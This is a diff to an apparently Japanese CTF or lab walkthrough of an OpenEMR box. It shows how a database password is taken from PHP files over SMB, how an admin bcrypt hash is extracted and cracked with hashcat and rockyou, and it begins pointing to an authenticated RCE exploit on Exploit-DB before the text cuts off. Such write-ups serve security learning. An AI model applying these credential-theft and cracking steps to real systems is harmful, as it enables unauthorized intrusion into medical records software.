@@ -34,7 +34,14 @@ def paste_clipboard(url, session_cookie):
 ...
 ```
 
-7. smbclient で接続し、 OpenEMR の PHP ファイルを読み取り、MySQL DB のパスワードを入手したので、接続
+7. smbclient で接続し、 OpenEMR の PHP ファイルを読み取り、MySQL DB のパスワードを入手したので、接続し、OpenEMR のハッシュ値 を抽出 したのでクラック（サーバーがSSL非対応というエラーがあったため、`--skip-ssl`を付与）
 ```sh
-mysql -u openemr -h $TargetIP -p --skip-ssl
+$ mysql -u openemr -h $TargetIP -p --skip-ssl
 ```
+![[Pasted image 20260214165811.png]]
+```sh
+$ echo -n '$2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC' > admin_hash.txt
+$ hashcat admin_hash.txt -m 3200 -a 0 /usr/share/wordlists/rockyou.txt --force
+```
+
+8. OpenEMR のログインフォームからログインし、バージョン情報を特定のうえ、Exploit-DB で RCE Authenticated の PoC ([45161 - Exploit-DB](https://www.exploit-db.com/exploits/45161)) を
